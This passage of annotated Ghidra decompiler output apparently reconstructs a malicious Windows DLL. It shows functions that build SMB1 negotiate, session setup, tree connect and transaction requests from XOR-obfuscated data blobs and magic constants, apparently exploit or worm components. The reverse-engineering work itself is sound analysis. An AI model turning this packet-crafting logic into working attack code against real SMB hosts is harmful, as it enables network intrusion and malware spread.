      puVar2 = (undefined4 *)Smb1BuildProtocolHeader_10002466(0x89,0x72,param_1,param_2,0,param_3,0,param_4);
      if (puVar2 != (undefined4 *)0x0) {
        puVar3 = (undefined4 *)AllocateZeroedHeapBuffer_10001000((uint)*in_EAX);
        if (puVar3 != (undefined4 *)0x0) {
          puVar5 = puVar3;
          for (iVar4 = 9; iVar4 != 0; iVar4 = iVar4 + -1) {
            *puVar5 = *puVar2;
            puVar2 = puVar2 + 1;
            puVar5 = puVar5 + 1;
          }
          memcpy(puVar3 + 9,local_c,0x65);
        }
        ReleaseTemporaryNetworkBuffer_100020D0();
        ReleaseTemporaryNetworkBuffer_100020D0();
        ReleaseTemporaryNetworkBuffer_100020D0();
        return puVar3;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return (undefined4 *)0x0;
}



char * __thiscall
/*
 * RECONSTRUCTED FUNCTION: Smb1BuildVariableLengthRequestBody_10002802
 * Ghidra symbol: FUN_10002802 | VA: 0x10002802 | original source line: 2469
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000
 */
Smb1BuildVariableLengthRequestBody_10002802(void *this,undefined2 *param_1,char param_2,undefined2 param_3,undefined2 param_4)

{
  char *pcVar1;
  ushort uVar2;
  ushort unaff_DI;
  
  if ((unaff_DI == 0) || (param_1 != (undefined2 *)0x0)) {
    uVar2 = 0x1b;
    if (param_2 == '\r') {
      uVar2 = 0x1d;
    }
    *(ushort *)this = uVar2 + unaff_DI;
    pcVar1 = (char *)AllocateZeroedHeapBuffer_10001000((uint)(ushort)(uVar2 + unaff_DI));
    if (pcVar1 != (char *)0x0) {
      pcVar1[5] = '\x04';
      pcVar1[6] = '\x11';
      pcVar1[7] = '\n';
      pcVar1[8] = '\0';
      *pcVar1 = param_2;
      pcVar1[1] = -1;
      *(undefined2 *)(pcVar1 + 9) = param_3;
      if (param_2 == '\f') {
        pcVar1[0x15] = '\0';
        pcVar1[0x16] = '\0';
        pcVar1[0x17] = '\0';
        pcVar1[0x18] = -0x80;
        *(ushort *)(pcVar1 + 0x19) = unaff_DI;
        *param_1 = param_4;
      }
      if (param_2 == '\r') {
        pcVar1[3] = -0x78;
        pcVar1[4] = '\0';
        pcVar1[0xf] = '\x01';
        pcVar1[0x10] = '\0';
        pcVar1[0x17] = -0x2c;
        pcVar1[0x18] = '\0';
        pcVar1[0x19] = '\0';
        pcVar1[0x1a] = '\0';
        *(ushort *)(pcVar1 + 0x1b) = unaff_DI;
      }
      if (unaff_DI != 0) {
        memcpy(pcVar1 + uVar2,param_1,(uint)unaff_DI);
      }
    }
  }
  else {
    pcVar1 = (char *)0x0;
  }
  return pcVar1;
}



undefined4 *
/*
 * RECONSTRUCTED FUNCTION: Smb1BuildSessionSetupRequest_100028B5
 * Ghidra symbol: FUN_100028b5 | VA: 0x100028B5 | original source line: 2524
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1BuildProtocolHeader_10002466, Smb1BuildVariableLengthRequestBody_10002802
 */
Smb1BuildSessionSetupRequest_100028B5(undefined2 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5,undefined2 param_6,ushort *param_7)

{
  uint uVar1;
  char in_AL;
  byte *pbVar2;
  char *_Src;
  undefined4 *puVar3;
  undefined4 *puVar4;
  int iVar5;
  undefined4 *puVar6;
  uint local_c;
  byte *local_8;
  
  if ((in_AL != '\f') && (in_AL != '\r')) {
    return (undefined4 *)0x0;
  }
  local_8 = (byte *)0x0;
  if (in_AL == '\f') {
    local_8 = (byte *)AllocateZeroedHeapBuffer_10001000(0x16);
    if (local_8 == (byte *)0x0) {
      return (undefined4 *)0x0;
    }
  }
  else if (in_AL == '\r') {
    iVar5 = 0x4b;
    local_8 = (byte *)AllocateZeroedHeapBuffer_10001000(0x4b);
    if (local_8 == (byte *)0x0) {
      return (undefined4 *)0x0;
    }
    memcpy(local_8,&DAT_10018b48,0x4b);
    pbVar2 = local_8;
    do {
      *pbVar2 = *pbVar2 ^ 0x73;
      pbVar2 = pbVar2 + 1;
      iVar5 = iVar5 + -1;
    } while (iVar5 != 0);
  }
  local_c = 0;
  _Src = Smb1BuildVariableLengthRequestBody_10002802(&local_c,(undefined2 *)local_8,in_AL,param_5,param_6);
  uVar1 = local_c;
  if (_Src != (char *)0x0) {
    *param_7 = (ushort)(local_c + 0x24);
    puVar3 = (undefined4 *)Smb1BuildProtocolHeader_10002466(local_c + 0x24,0x73,param_1,param_2,0,param_3,0,param_4);
    if (puVar3 != (undefined4 *)0x0) {
      puVar4 = (undefined4 *)AllocateZeroedHeapBuffer_10001000((uint)*param_7);
      if (puVar4 == (undefined4 *)0x0) {
        puVar4 = (undefined4 *)0x0;
      }
      else {
        puVar6 = puVar4;
        for (iVar5 = 9; iVar5 != 0; iVar5 = iVar5 + -1) {
          *puVar6 = *puVar3;
          puVar3 = puVar3 + 1;
          puVar6 = puVar6 + 1;
        }
        memcpy(puVar4 + 9,_Src,uVar1 & 0xffff);
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
      ReleaseTemporaryNetworkBuffer_100020D0();
      ReleaseTemporaryNetworkBuffer_100020D0();
      return puVar4;
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  ReleaseTemporaryNetworkBuffer_100020D0();
  return (undefined4 *)0x0;
}



undefined4 *
/*
 * RECONSTRUCTED FUNCTION: Smb1BuildTreeConnectRequest_100029CE
 * Ghidra symbol: FUN_100029ce | VA: 0x100029CE | original source line: 2597
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1BuildProtocolHeader_10002466
 */
Smb1BuildTreeConnectRequest_100029CE(undefined2 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4)

{
  ushort *in_EAX;
  byte *_Dst;
  byte *pbVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  undefined4 *puVar5;
  undefined2 *local_c;
  
  _Dst = (byte *)AllocateZeroedHeapBuffer_10001000(0x2d);
  if (_Dst != (byte *)0x0) {
    memcpy(_Dst,s_u_u_uDuGuFu_uDuGu_uFuDu_uGu_u<u__10018b94,0x2d);
    iVar4 = 0x2d;
    pbVar1 = _Dst;
    do {
      *pbVar1 = *pbVar1 ^ 0x75;
      pbVar1 = pbVar1 + 1;
      iVar4 = iVar4 + -1;
    } while (iVar4 != 0);
    local_c = (undefined2 *)AllocateZeroedHeapBuffer_10001000(0x38);
    if (local_c == (undefined2 *)0x0) {
      local_c = (undefined2 *)0x0;
    }
    else {
      *(undefined2 *)((int)local_c + 3) = 0x58;
      *(undefined2 *)((int)local_c + 5) = 8;
      *(undefined2 *)((int)local_c + 7) = 1;
      *(undefined2 *)((int)local_c + 9) = 0x2d;
      *local_c = 0xff04;
      memcpy((void *)((int)local_c + 0xb),_Dst,0x2d);
    }
    if (local_c != (undefined2 *)0x0) {
      *in_EAX = 0x5c;
      puVar2 = (undefined4 *)Smb1BuildProtocolHeader_10002466(0x5c,0x75,0xc007,param_1,0,param_2,param_3,param_4);
      if (puVar2 != (undefined4 *)0x0) {
        puVar3 = (undefined4 *)AllocateZeroedHeapBuffer_10001000((uint)*in_EAX);
        if (puVar3 != (undefined4 *)0x0) {
          puVar5 = puVar3;
          for (iVar4 = 9; iVar4 != 0; iVar4 = iVar4 + -1) {
            *puVar5 = *puVar2;
            puVar2 = puVar2 + 1;
            puVar5 = puVar5 + 1;
          }
          memcpy(puVar3 + 9,local_c,0x38);
        }
        ReleaseTemporaryNetworkBuffer_100020D0();
        ReleaseTemporaryNetworkBuffer_100020D0();
        ReleaseTemporaryNetworkBuffer_100020D0();
        return puVar3;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return (undefined4 *)0x0;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1PrepareTransactionDataBuffer_10002ADF
 * Ghidra symbol: FUN_10002adf | VA: 0x10002ADF | original source line: 2659
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000
 */
void __fastcall Smb1PrepareTransactionDataBuffer_10002ADF(undefined2 param_1,undefined2 param_2,char param_3,char param_4)

{
  byte bVar1;
  ushort *in_EAX;
  undefined1 *puVar2;
  byte *pbVar3;
  byte *pbVar4;
  int iVar5;
  
  *in_EAX = 0x23;
  if (param_3 == '\x02') {
    *in_EAX = 0x2a;
  }
  if (param_3 == '\x03') {
    *in_EAX = *in_EAX + 0x59;
  }
  puVar2 = (undefined1 *)AllocateZeroedHeapBuffer_10001000((uint)*in_EAX);
  if (puVar2 != (undefined1 *)0x0) {
    *puVar2 = 0x10;
    puVar2[0x1b] = 2;
    if (param_3 == '\x01') {
      *(undefined2 *)(puVar2 + 3) = 1;
      *(undefined2 *)(puVar2 + 7) = 1;
      *(undefined2 *)(puVar2 + 0x1d) = 0x23;
      *(undefined2 *)(puVar2 + 5) = param_2;
      *(undefined4 *)(puVar2 + 0xd) = 0x1000;
      *(undefined2 *)(puVar2 + 0x1f) = param_1;
    }
    if (param_3 == '\0') {
      *(undefined4 *)(puVar2 + 0xd) = 1;
      *(undefined2 *)(puVar2 + 3) = param_2;
      *(undefined2 *)(puVar2 + 0x1d) = 0x36;
      *(undefined2 *)(puVar2 + 0x1f) = param_1;
    }
    if (param_3 == '\x02') {
      *(undefined2 *)(puVar2 + 0x15) = 0x4a;
      *(undefined2 *)(puVar2 + 0x19) = 0x4a;
      *(undefined2 *)(puVar2 + 0x21) = 7;
      *(undefined2 *)(puVar2 + 0x23) = 0x505c;
      *(undefined2 *)(puVar2 + 0x25) = 0x5049;
      *(undefined2 *)(puVar2 + 5) = param_2;
      *(undefined2 *)(puVar2 + 7) = param_2;
      *(undefined4 *)(puVar2 + 0x1d) = 0x23;
      *(undefined2 *)(puVar2 + 0x27) = 0x5c45;
    }
    if (param_3 == '\x03') {
      *(undefined2 *)(puVar2 + 7) = 0x1000;
      *(undefined2 *)(puVar2 + 0xb) = 8;
      *(undefined2 *)(puVar2 + 0x17) = 0x48;
      *(undefined2 *)(puVar2 + 0x1f) = param_1;
      *(undefined2 *)(puVar2 + 0x1d) = 0x26;
      iVar5 = 0x59;
      *(undefined2 *)(puVar2 + 0x15) = param_2;
      *(undefined2 *)(puVar2 + 0x19) = param_2;
      *(undefined2 *)(puVar2 + 0x21) = 0x59;
      *(undefined2 *)(puVar2 + 3) = 0x48;
      *(undefined4 *)(puVar2 + 0xd) = 1000;
      pbVar4 = &DAT_10018bd8;
      pbVar3 = puVar2 + 0x23;
      do {
        bVar1 = *pbVar4;
        pbVar4 = pbVar4 + 1;
        *pbVar3 = bVar1 ^ 0x25;
        pbVar3 = pbVar3 + 1;
        iVar5 = iVar5 + -1;
      } while (iVar5 != 0);
      if (param_4 == '\0') {
        *(undefined4 *)(puVar2 + 0x54) = 0x12345778;
        *(undefined4 *)(puVar2 + 0x58) = 0xabcd1234;
        *(undefined4 *)(puVar2 + 0x5c) = 0x230100ef;
        *(undefined4 *)(puVar2 + 0x60) = 0xab896745;
      }
    }
  }
  return;
}



undefined4 * __fastcall
/*
 * RECONSTRUCTED FUNCTION: Smb1BuildTransactionRequest_10002C1E
 * Ghidra symbol: FUN_10002c1e | VA: 0x10002C1E | original source line: 2740
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1BuildProtocolHeader_10002466, Smb1PrepareTransactionDataBuffer_10002ADF
 */
Smb1BuildTransactionRequest_10002C1E(undefined2 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5,undefined2 param_6,undefined2 param_7,undefined2 param_8,char param_9
            ,char param_10,ushort *param_11)

{
  void *_Src;
  undefined4 *puVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 *puVar4;
  
  _Src = (void *)Smb1PrepareTransactionDataBuffer_10002ADF(param_1,param_2,param_9,param_10);
  if (_Src != (void *)0x0) {
    *param_11 = 0x24;
    puVar1 = (undefined4 *)Smb1BuildProtocolHeader_10002466(0x24,0x25,param_3,param_4,param_5,param_6,param_7,param_8);
    if (puVar1 != (undefined4 *)0x0) {
      puVar2 = (undefined4 *)AllocateZeroedHeapBuffer_10001000((uint)*param_11);
      if (puVar2 != (undefined4 *)0x0) {
        puVar4 = puVar2;
        for (iVar3 = 9; iVar3 != 0; iVar3 = iVar3 + -1) {
          *puVar4 = *puVar1;
          puVar1 = puVar1 + 1;
          puVar4 = puVar4 + 1;
        }
        memcpy(puVar2 + 9,_Src,0);
        ReleaseTemporaryNetworkBuffer_100020D0();
        ReleaseTemporaryNetworkBuffer_100020D0();
        return puVar2;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return (undefined4 *)0x0;
}



undefined1 * __thiscall
/*
 * RECONSTRUCTED FUNCTION: Smb1BuildTransactionParameterBlock_10002CCF
 * Ghidra symbol: FUN_10002ccf | VA: 0x10002CCF | original source line: 2779
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000
 */
Smb1BuildTransactionParameterBlock_10002CCF(void *this,undefined4 param_1,undefined4 *param_2,void *param_3,ushort param_4)

{
  undefined1 *puVar1;
  
  if (((param_4 == 0) || (param_3 != (void *)0x0)) && (param_2 != (undefined4 *)0x0)) {
    *(ushort *)this = param_4 + 0x2e;
    puVar1 = (undefined1 *)AllocateZeroedHeapBuffer_10001000((uint)(ushort)(param_4 + 0x2e));
    if (puVar1 != (undefined1 *)0x0) {
      *(undefined2 *)(puVar1 + 0x13) = 0xc;
      *(undefined2 *)(puVar1 + 1) = 0xc;
      *(undefined2 *)(puVar1 + 0x15) = 0x42;
      *(undefined2 *)(puVar1 + 0x19) = 0x4e;
      *(undefined2 *)(puVar1 + 5) = 1;
      *(ushort *)(puVar1 + 0x1f) = param_4 + 0xd;
      *(undefined2 *)(puVar1 + 0x1d) = 0xe;
      *puVar1 = 0xf;
      *(undefined4 *)(puVar1 + 0xd) = param_1;
      puVar1[0x1b] = 1;
      *(undefined4 *)(puVar1 + 0x22) = *param_2;
      *(undefined4 *)(puVar1 + 0x26) = param_2[1];
      *(undefined4 *)(puVar1 + 0x2a) = param_2[2];
      if (param_4 != 0) {
        *(ushort *)(puVar1 + 3) = param_4;
        *(undefined4 *)(puVar1 + 0xd) = param_1;
        *(ushort *)(puVar1 + 0x17) = param_4;
        memcpy(puVar1 + 0x2e,param_3,(uint)param_4);
      }
    }
  }
  else {
    puVar1 = (undefined1 *)0x0;
  }
  return puVar1;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1BuildDataBlockVariantA_10002D82
 * Ghidra symbol: FUN_10002d82 | VA: 0x10002D82 | original source line: 2817
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000
 */
void __thiscall Smb1BuildDataBlockVariantA_10002D82(void *this,char param_1)

{
  undefined2 *puVar1;
  ushort uVar2;
  uint uVar3;
  byte bVar4;
  ushort uVar5;
  undefined2 uVar6;
  undefined1 *local_8;
  
  uVar6 = 0;
  uVar5 = 0;
  local_8 = (undefined1 *)0x0;
  if (param_1 == '\0') {
    uVar5 = 0xf;
    local_8 = &DAT_10018bc4;
    uVar6 = 0xc;
  }
  if (param_1 == '\x01') {
    uVar5 = 0x11;
    local_8 = &DAT_10018b34;
    uVar6 = 0xe;
  }
  *(ushort *)this = uVar5 + 0x33;
  puVar1 = (undefined2 *)AllocateZeroedHeapBuffer_10001000((uint)(ushort)(uVar5 + 0x33));
  if (puVar1 != (undefined2 *)0x0) {
    *(undefined2 *)((int)puVar1 + 3) = 0x62;
    bVar4 = 0;
    *puVar1 = 0xff18;
    puVar1[3] = uVar6;
    *(undefined4 *)(puVar1 + 4) = 0x16;
    *(undefined4 *)(puVar1 + 8) = 0x2019f;
    *(undefined4 *)(puVar1 + 0x10) = 3;
    *(undefined4 *)(puVar1 + 0x12) = 1;
    *(undefined4 *)(puVar1 + 0x14) = 0x40;
    *(undefined4 *)(puVar1 + 0x16) = 2;
    *(undefined1 *)(puVar1 + 0x18) = 3;
    *(ushort *)((int)puVar1 + 0x31) = uVar5;
    uVar2 = 0;
    while (uVar2 < uVar5) {
      uVar3 = (uint)bVar4;
      bVar4 = bVar4 + 1;
      *(byte *)(uVar3 + 0x33 + (int)puVar1) = local_8[uVar3] ^ 0xa2;
      uVar2 = (ushort)bVar4;
    }
  }
  return;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1BuildDataBlockVariantB_10002E30
 * Ghidra symbol: FUN_10002e30 | VA: 0x10002E30 | original source line: 2869
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000
 */
char * Smb1BuildDataBlockVariantB_10002E30(char param_1,undefined2 param_2,void *param_3)

{
  char *pcVar1;
  ushort *unaff_EBX;
  ushort unaff_DI;
  
  if ((unaff_DI == 0) || (param_3 != (void *)0x0)) {
    *unaff_EBX = unaff_DI + 0x20;
    if (param_1 == '\f') {
      *unaff_EBX = unaff_DI + 0x1c;
    }
    pcVar1 = (char *)AllocateZeroedHeapBuffer_10001000((uint)*unaff_EBX);
    if (pcVar1 != (char *)0x0) {
      pcVar1[0xb] = -1;
      pcVar1[0xc] = -1;
      pcVar1[0xd] = -1;
      pcVar1[0xe] = -1;
      *pcVar1 = param_1;
      pcVar1[1] = -1;
      *(undefined2 *)(pcVar1 + 5) = param_2;
      if (param_1 == '\f') {
        pcVar1[3] = '<';
        pcVar1[4] = '\0';
        pcVar1[0xf] = '\x04';
        pcVar1[0x10] = '\0';
        pcVar1[0x11] = '\0';
        pcVar1[0x12] = -2;
        *(ushort *)(pcVar1 + 0x15) = unaff_DI;
        pcVar1[0x17] = ';';
        pcVar1[0x18] = '\0';
        *(ushort *)(pcVar1 + 0x19) = unaff_DI;
      }
      if (param_1 == '\x0e') {
        pcVar1[3] = '@';
        pcVar1[4] = '\0';
        pcVar1[0xf] = '\b';
        pcVar1[0x10] = '\0';
        pcVar1[0x17] = '@';
        pcVar1[0x18] = '\0';
        *(ushort *)(pcVar1 + 0x11) = unaff_DI;
        *(ushort *)(pcVar1 + 0x15) = unaff_DI;
        *(ushort *)(pcVar1 + 0x1d) = unaff_DI + 1;
      }
      if (unaff_DI != 0) {
        memcpy(pcVar1 + ((uint)*unaff_EBX - (uint)unaff_DI),param_3,(uint)unaff_DI);
      }
    }
  }
  else {
    pcVar1 = (char *)0x0;
  }
  return pcVar1;
}



/*
 * RECONSTRUCTED FUNCTION: Smb1ExchangeInitialRequest_10002EF5
 * Ghidra symbol: FUN_10002ef5 | VA: 0x10002EF5 | original source line: 2926
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1TransmitRequestBuffer_1000243F, Smb1BuildNegotiateRequest_1000270A, Smb1ReceiveNetworkReply_1000688F
 */
undefined4 Smb1ExchangeInitialRequest_10002EF5(undefined2 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4)

{
  undefined4 in_EAX;
  undefined4 *puVar1;
  undefined4 uVar2;
  int iVar3;
  int iVar4;
  
  puVar1 = Smb1BuildNegotiateRequest_1000270A(param_1,param_2,param_3,param_4);
  if (puVar1 == (undefined4 *)0x0) {
    uVar2 = 0xffffffff;
  }
  else {
    iVar3 = AllocateZeroedHeapBuffer_10001000(0x1000);
    if (iVar3 == 0) {
      ReleaseTemporaryNetworkBuffer_100020D0();
      uVar2 = 0xffffffff;
    }
    else {
      iVar4 = Smb1ReceiveNetworkReply_1000688F((int)puVar1);
      if ((iVar4 == 0) && (iVar4 = Smb1TransmitRequestBuffer_1000243F(in_EAX,1), iVar4 == 0)) {
        uVar2 = *(undefined4 *)(iVar3 + 9);
      }
      else {
        uVar2 = 0xffffffff;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
      ReleaseTemporaryNetworkBuffer_100020D0();
    }
  }
  return uVar2;
}



undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1ExchangeSessionSetup_10002F88
 * Ghidra symbol: FUN_10002f88 | VA: 0x10002F88 | original source line: 2963
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1TransmitRequestBuffer_1000243F, Smb1BuildSessionSetupRequest_100028B5, Smb1ReceiveNetworkReply_1000688F
 */
Smb1ExchangeSessionSetup_10002F88(undefined2 param_1,undefined2 param_2,undefined2 param_3,undefined2 *param_4,
            undefined2 param_5,undefined4 param_6,undefined2 param_7,undefined2 param_8,
            undefined4 *param_9,undefined2 *param_10)

{
  undefined4 in_EAX;
  undefined4 *puVar1;
  void *_Src;
  int iVar2;
  void *_Dst;
  ushort local_8 [2];
  
  local_8[0] = 0;
  local_8[1] = 0;
  puVar1 = Smb1BuildSessionSetupRequest_100028B5(param_1,param_2,param_3,param_5,param_7,param_8,local_8);
  if (puVar1 == (undefined4 *)0x0) {
    _param_7 = 0xffffffff;
  }
  else {
    _Src = (void *)AllocateZeroedHeapBuffer_10001000(0x1000);
    if (_Src == (void *)0x0) {
      ReleaseTemporaryNetworkBuffer_100020D0();
      _param_7 = 0xffffffff;
    }
    else {
      iVar2 = Smb1ReceiveNetworkReply_1000688F((int)puVar1);
      if ((iVar2 == 0) && (iVar2 = Smb1TransmitRequestBuffer_1000243F(in_EAX,1), iVar2 == 0)) {
        *param_4 = *(undefined2 *)((int)_Src + 0x20);
        _param_7 = *(undefined4 *)((int)_Src + 9);
        _Dst = (void *)AllocateZeroedHeapBuffer_10001000(0);
        *param_9 = _Dst;
        if (_Dst == (void *)0x0) {
          _param_7 = 0xffffffff;
        }
        else {
          *param_10 = 0;
          memcpy(_Dst,_Src,0);
        }
      }
      else {
        _param_7 = 0xffffffff;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
      ReleaseTemporaryNetworkBuffer_100020D0();
    }
  }
  return _param_7;
}



undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1ExchangeTreeConnection_10003061
 * Ghidra symbol: FUN_10003061 | VA: 0x10003061 | original source line: 3015
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1TransmitRequestBuffer_1000243F, Smb1BuildTreeConnectRequest_100029CE, Smb1ReceiveNetworkReply_1000688F
 */
Smb1ExchangeTreeConnection_10003061(undefined2 param_1,undefined2 *param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5)

{
  undefined4 in_EAX;
  undefined4 *puVar1;
  undefined4 uVar2;
  int iVar3;
  int iVar4;
  
  puVar1 = Smb1BuildTreeConnectRequest_100029CE(param_1,param_3,param_4,param_5);
  if (puVar1 == (undefined4 *)0x0) {
    uVar2 = 0xffffffff;
  }
  else {
    iVar3 = AllocateZeroedHeapBuffer_10001000(0x1000);
    if (iVar3 == 0) {
      ReleaseTemporaryNetworkBuffer_100020D0();
      uVar2 = 0xffffffff;
    }
    else {
      iVar4 = Smb1ReceiveNetworkReply_1000688F((int)puVar1);
      if ((iVar4 == 0) && (iVar4 = Smb1TransmitRequestBuffer_1000243F(in_EAX,1), iVar4 == 0)) {
        uVar2 = *(undefined4 *)(iVar3 + 9);
        *param_2 = *(undefined2 *)(iVar3 + 0x1c);
      }
      else {
        uVar2 = 0xffffffff;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
      ReleaseTemporaryNetworkBuffer_100020D0();
    }
  }
  return uVar2;
}



undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1ExchangeTransactionVariantA_100030FE
 * Ghidra symbol: FUN_100030fe | VA: 0x100030FE | original source line: 3054
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1TransmitRequestBuffer_1000243F, Smb1BuildProtocolHeader_10002466, Smb1ReceiveNetworkReply_1000688F
 */
Smb1ExchangeTransactionVariantA_100030FE(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5,undefined2 param_6)

{
  undefined2 *puVar1;
  undefined4 *puVar2;
  int iVar3;
  int iVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  undefined4 uVar7;
  
  puVar1 = (undefined2 *)AllocateZeroedHeapBuffer_10001000(3);
  if (puVar1 != (undefined2 *)0x0) {
    puVar2 = (undefined4 *)Smb1BuildProtocolHeader_10002466(0x27,0x71,0xc007,param_2,param_3,param_4,param_5,param_6);
    if (puVar2 != (undefined4 *)0x0) {
      puVar5 = (undefined4 *)AllocateZeroedHeapBuffer_10001000(0x27);
      if (puVar5 != (undefined4 *)0x0) {
        puVar6 = puVar5;
        for (iVar3 = 9; iVar3 != 0; iVar3 = iVar3 + -1) {
          *puVar6 = *puVar2;
          puVar2 = puVar2 + 1;
          puVar6 = puVar6 + 1;
        }
        *(undefined2 *)(puVar5 + 9) = *puVar1;
        *(undefined1 *)((int)puVar5 + 0x26) = *(undefined1 *)(puVar1 + 1);
        ReleaseTemporaryNetworkBuffer_100020D0();
        ReleaseTemporaryNetworkBuffer_100020D0();
        goto LAB_1000318b;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  puVar5 = (undefined4 *)0x0;
LAB_1000318b:
  if (puVar5 != (undefined4 *)0x0) {
    iVar3 = AllocateZeroedHeapBuffer_10001000(0x1000);
    if (iVar3 != 0) {
      iVar4 = Smb1ReceiveNetworkReply_1000688F((int)puVar5);
      if ((iVar4 == 0) && (iVar4 = Smb1TransmitRequestBuffer_1000243F(param_1,1), iVar4 == 0)) {
        uVar7 = *(undefined4 *)(iVar3 + 9);
      }
      else {
        uVar7 = 0xffffffff;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
      ReleaseTemporaryNetworkBuffer_100020D0();
      return uVar7;
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return 0xffffffff;
}



undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1ExchangeTransactionVariantB_100031FB
 * Ghidra symbol: FUN_100031fb | VA: 0x100031FB | original source line: 3112
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: AllocateZeroedHeapBuffer_10001000, ReleaseTemporaryNetworkBuffer_100020D0, Smb1TransmitRequestBuffer_1000243F, Smb1BuildProtocolHeader_10002466, Smb1ReceiveNetworkReply_1000688F
 */
Smb1ExchangeTransactionVariantB_100031FB(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,
            undefined2 param_5,undefined2 param_6)

{
  undefined4 *puVar1;
  int iVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  undefined4 uVar6;
  undefined4 *local_8;
  
  local_8 = (undefined4 *)AllocateZeroedHeapBuffer_10001000(7);
  if (local_8 == (undefined4 *)0x0) {
    local_8 = (undefined4 *)0x0;
  }
  else {
    *(undefined2 *)local_8 = 0xff02;
  }
  if (local_8 != (undefined4 *)0x0) {
    puVar1 = (undefined4 *)Smb1BuildProtocolHeader_10002466(0x2b,0x74,0xc007,param_2,param_3,param_4,param_5,param_6);
    if (puVar1 != (undefined4 *)0x0) {
      puVar4 = (undefined4 *)AllocateZeroedHeapBuffer_10001000(0x2b);
      if (puVar4 != (undefined4 *)0x0) {
        puVar5 = puVar4;
        for (iVar2 = 9; iVar2 != 0; iVar2 = iVar2 + -1) {
          *puVar5 = *puVar1;
          puVar1 = puVar1 + 1;
          puVar5 = puVar5 + 1;
        }
        puVar4[9] = *local_8;
        *(undefined2 *)(puVar4 + 10) = *(undefined2 *)(local_8 + 1);
        *(undefined1 *)((int)puVar4 + 0x2a) = *(undefined1 *)((int)local_8 + 6);
        ReleaseTemporaryNetworkBuffer_100020D0();
        ReleaseTemporaryNetworkBuffer_100020D0();
        goto LAB_1000329e;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  puVar4 = (undefined4 *)0x0;
LAB_1000329e:
  if (puVar4 != (undefined4 *)0x0) {
    iVar2 = AllocateZeroedHeapBuffer_10001000(0x1000);
    if (iVar2 != 0) {
      iVar3 = Smb1ReceiveNetworkReply_1000688F((int)puVar4);
      if ((iVar3 == 0) && (iVar3 = Smb1TransmitRequestBuffer_1000243F(param_1,1), iVar3 == 0)) {
        uVar6 = *(undefined4 *)(iVar2 + 9);
      }
      else {
        uVar6 = 0xffffffff;
      }
      ReleaseTemporaryNetworkBuffer_100020D0();
      ReleaseTemporaryNetworkBuffer_100020D0();
      return uVar6;
    }
    ReleaseTemporaryNetworkBuffer_100020D0();
  }
  return 0xffffffff;
}



undefined4
/*
 * RECONSTRUCTED FUNCTION: Smb1ExchangeNtTransaction_1000330E
 * Ghidra symbol: FUN_1000330e | VA: 0x1000330E | original source line: 3177
